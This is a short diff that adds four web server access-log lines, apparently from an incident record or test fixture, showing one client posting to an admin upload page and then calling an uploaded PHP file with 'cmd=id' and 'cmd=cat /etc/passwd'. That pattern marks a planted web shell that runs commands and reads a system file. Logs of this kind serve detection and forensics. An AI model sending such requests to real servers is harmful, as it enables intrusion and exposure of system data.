@@ -1,0 +1,4 @@
+203.0.113.9 - - [28/Jun/2026:03:02:11] "GET /index.php HTTP/1.1" 200 5312 "-" "Mozilla/5.0"
+45.133.1.88 - - [28/Jun/2026:03:14:55] "POST /admin/upload.php HTTP/1.1" 200 41 "-" "curl/8.4.0"
+45.133.1.88 - - [28/Jun/2026:03:15:02] "GET /uploads/av4t4r.php?cmd=id HTTP/1.1" 200 56 "-" "curl/8.4.0"
+45.133.1.88 - - [28/Jun/2026:03:15:20] "GET /uploads/av4t4r.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1422 "-" "curl/8.4.0"
